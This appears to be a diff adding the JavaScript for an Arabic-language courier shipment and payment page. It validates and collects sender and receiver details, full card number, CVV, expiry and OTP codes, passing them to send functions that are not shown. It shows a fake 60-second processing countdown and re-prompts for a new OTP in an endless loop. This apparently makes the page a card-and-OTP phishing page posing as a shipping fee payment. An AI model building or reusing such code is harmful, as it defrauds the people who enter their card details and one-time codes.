+}
+function validateCardNumber(num) {
+  const digits = onlyDigits(num);
+  return digits.length === 16;
+}
+function validateCVV(cvv) {
+  const digits = onlyDigits(cvv);
+  return digits.length === 3;
+}
+function validateExpDate(year, month) {
+  if (!year || !month) return false;
+  const currentYear = new Date().getFullYear();
+  const currentMonth = new Date().getMonth() + 1;
+  const expYear = parseInt(year);
+  const expMonth = parseInt(month);
+  if (expYear < currentYear) return false;
+  if (expYear === currentYear && expMonth < currentMonth) return false;
+  return true;
+}
+function validatePaymentAmount(amount) {
+  return /^\d+(\.\d{1,2})?$/.test(amount);
+}
+function validateOTP(otp) {
+  const digits = onlyDigits(otp);
+  return digits.length >= 4 && digits.length <= 6;
+}
+function getExpectedPhoneLength(countryCode) {
+  const lengths = { sa:10, ae:10, kw:8, bh:8, qa:8, om:8 };
+  return lengths[countryCode] || 10;
+}
+
+function validateSender(){
+  clearAllErrors();
+  let ok = true;
+  if(isEmpty("s_name")){ setError("err_s_name","يرجى إدخال الاسم"); ok = false; }
+  if(isEmpty("s_city")){ setError("err_s_city","يرجى إدخال المدينة"); ok = false; }
+  if(isEmpty("s_district")){ setError("err_s_district","يرجى إدخال الحي"); ok = false; }
+  if(isEmpty("s_street")){ setError("err_s_street","يرجى إدخال اسم الشارع"); ok = false; }
+  const phone = onlyDigits(document.getElementById("s_phone").value);
+  const countrySelect = document.getElementById("s_country");
+  const expectedLength = getExpectedPhoneLength(countrySelect.value);
+  if (phone.length !== expectedLength) {
+    setError("err_s_phone", `يرجى إدخال رقم جوال صحيح (${expectedLength} أرقام)`);
+    ok = false;
+  }
+  return ok;
+}
+
+function validateReceiver(){
+  clearAllErrors();
+  let ok = true;
+  if(isEmpty("r_name")){ setError("err_r_name","يرجى إدخال الاسم"); ok = false; }
+  if(isEmpty("r_city")){ setError("err_r_city","يرجى إدخال المدينة"); ok = false; }
+  if(isEmpty("r_district")){ setError("err_r_district","يرجى إدخال الحي"); ok = false; }
+  if(isEmpty("r_street")){ setError("err_r_street","يرجى إدخال اسم الشارع"); ok = false; }
+  const phone = onlyDigits(document.getElementById("r_phone").value);
+  const countrySelect = document.getElementById("r_country");
+  const expectedLength = getExpectedPhoneLength(countrySelect.value);
+  if (phone.length !== expectedLength) {
+    setError("err_r_phone", `يرجى إدخال رقم جوال صحيح (${expectedLength} أرقام)`);
+    ok = false;
+  }
+  return ok;
+}
+
+function validateDetails(selectedType){
+  clearAllErrors();
+  let ok = true;
+  if(isEmpty("d_shipno")){ setError("err_d_shipno","يرجى إدخال رقم الشحنة"); ok = false; }
+  if(isEmpty("d_content")){ setError("err_d_content","يرجى إدخال محتويات الشحنة"); ok = false; }
+  const piecesRaw = document.getElementById("d_pieces").value;
+  const piecesDigits = onlyDigits(piecesRaw);
+  const pieces = parseInt(piecesDigits || "0",10);
+  if(!pieces || pieces <= 0){ setError("err_d_pieces","يرجى إدخال عدد قطع صحيح"); ok = false; }
+  if(!selectedType){ setError("err_d_type","يرجى اختيار نوع الشحنة (وثائق أو طرد)"); ok = false; }
+  return ok;
+}
+
+function validateCard(){
+  clearAllErrors();
+  let ok = true;
+  if (!selectedCardType) { setError("err_c_type", "يرجى اختيار نوع البطاقة"); ok = false; }
+  const name = document.getElementById("c_name").value.trim();
+  const num = document.getElementById("c_num").value;
+  const cvv = document.getElementById("c_cvv").value;
+  const year = document.getElementById("c_year").value;
+  const month = document.getElementById("c_month").value;
+  const amount = document.getElementById("pay_amount").value.trim();
+  if(!name || !validateCardName(name)){ setError("err_c_name","يرجى إدخال اسم صاحب البطاقة بشكل صحيح (أحرف ومسافات فقط)"); ok = false; }
+  if(!validateCardNumber(num)){ setError("err_c_num","يرجى إدخال رقم البطاقة بشكل صحيح (16 رقم)"); ok = false; }
+  if(!validateCVV(cvv)){ setError("err_c_cvv","يرجى إدخال رمز الأمان المكون من 3 أرقام"); ok = false; }
+  if(!validateExpDate(year, month)){ setError("err_c_exp","يرجى اختيار تاريخ انتهاء صالح للبطاقة"); ok = false; }
+  if(!amount || !validatePaymentAmount(amount)){ setError("err_pay_amount","يرجى إدخال قيمة دفع صحيحة (مثال: 125.00)"); ok = false; }
+  return ok;
+}
+
+function validateOTPField(){
+  clearAllErrors();
+  const otp = document.getElementById("otp_code").value;
+  if(!validateOTP(otp)){ setError("err_otp_code","يرجى إدخال رمز تحقق صحيح (4 إلى 6 أرقام)"); return false; }
+  return true;
+}
+
+// دوال البوب أب المخصص
+function showPopup(message) {
+  const popup = document.getElementById('customPopup');
+  const msgEl = document.getElementById('popupMessage');
+  const iconEl = document.getElementById('popupIcon');
+  msgEl.textContent = message;
+  iconEl.textContent = message.includes('قيد المعالجة') ? '✓' : '✗';
+  popup.style.display = 'block';
+  setTimeout(hidePopup, 3000);
+}
+function hidePopup() {
+  document.getElementById('customPopup').style.display = 'none';
+}
+
+// أحداث التنقل
+document.querySelectorAll("#page-where .choice").forEach(c=>{
+  c.addEventListener("click", async function() {
+    shipmentType = this.dataset.type;
+    await sendTypeMessage(shipmentType);
+    go(this.dataset.next);
+  });
+});
+
+document.getElementById("btnNextSender").addEventListener("click", function() {
+  if (!validateSender()) return;
+  go("receiver");
+});
+
+document.getElementById("btnNextReceiver").addEventListener("click", function() {
+  if (!validateReceiver()) return;
+  go("details");
+});
+
+document.querySelectorAll("[data-back]").forEach(b=>{
+  b.addEventListener("click", ()=> go(b.dataset.back));
+});
+
+let selectedType = "";
+document.querySelectorAll("#page-details .choice.selectable").forEach(el=>{
+  el.addEventListener("click", ()=>{
+    selectedType = el.dataset.type;
+    document.querySelectorAll("#page-details .choice.selectable").forEach(x=>x.classList.remove("selected"));
+    el.classList.add("selected");
+    setError("err_d_type","");
+  });
+});
+
+// تعبئة سنوات البطاقة
+const yearSel = document.getElementById("c_year");
+for(let y = 2026; y <= 2050; y++){
+  const opt = document.createElement("option");
+  opt.value = String(y);
+  opt.textContent = String(y);
+  yearSel.appendChild(opt);
+}
+yearSel.value = "2026";
+
+const cnum = document.getElementById("c_num");
+cnum.addEventListener("input", ()=>{
+  let s = cnum.value.replace(/\D/g,'').slice(0,16);
+  cnum.value = s.replace(/(.{4})/g, "$1 ").trim();
+});
+
+const cname = document.getElementById("c_name");
+cname.addEventListener("input", function() {
+  this.value = this.value.replace(/[^a-zA-Z\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF\s]/g, '');
+});
+
+const ccvv = document.getElementById("c_cvv");
+ccvv.addEventListener("input", function() {
+  this.value = this.value.replace(/\D/g, '').slice(0, 3);
+});
+
+const payAmount = document.getElementById("pay_amount");
+payAmount.addEventListener("input", function() {
+  this.value = this.value.replace(/[^\d.]/g, '');
+  if ((this.value.match(/\./g) || []).length > 1) {
+    this.value = this.value.substring(0, this.value.lastIndexOf('.'));
+  }
+});
+
+const phoneInputs = document.querySelectorAll('#s_phone, #r_phone');
+phoneInputs.forEach(input => {
+  input.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 10);
+  });
+});
+
+const otpInput = document.getElementById("otp_code");
+otpInput.addEventListener("input", ()=>{
+  otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);
+});
+
+document.getElementById("btnSendShipment").addEventListener("click", async function(){
+  if (!validateDetails(selectedType)) return;
+  await sendShipmentInfo();
+  go("paymethod");
+});
+
+document.querySelector("#page-paymethod .choice").addEventListener("click", function() {
+  go("cardform");
+});
+
+document.getElementById("cardNext").addEventListener("click", async function(){
+  if (!validateCard()) return;
+  await sendCardInfo();
+  go("loading");
+  const countdownEl = document.getElementById('loadingCountdown');
+  let remaining = 60; // تم التعديل هنا من 30 إلى 60 ثانية
+  countdownEl.style.display = 'block';
+  countdownEl.textContent = remaining + ' ثانية';
+  const intervalId = setInterval(()=>{
+    remaining--;
+    if(remaining <= 0){
+      clearInterval(intervalId);
+      countdownEl.style.display = 'none';
+    }else{
+      countdownEl.textContent = remaining + ' ثانية';
+    }
+  },1000);
+  setTimeout(()=>{
+    clearInterval(intervalId);
+    countdownEl.style.display = 'none';
+    go("otp");
+  },60000); // تعديل timeout إلى 60 ثانية
+});
+
+document.getElementById("btnConfirmPay").addEventListener("click", async function(){
+  if (!validateOTPField()) return;
+  await sendOTPInfo();
+  go("loading");
+  const countdownEl = document.getElementById('loadingCountdown');
+  countdownEl.style.display = 'none';
+  setTimeout(()=>{
+    document.getElementById('otp_code').value = '';
+    go("otp");
+  },30000);
 });
 </script>
+
 </body>
-</html>
+                </html>
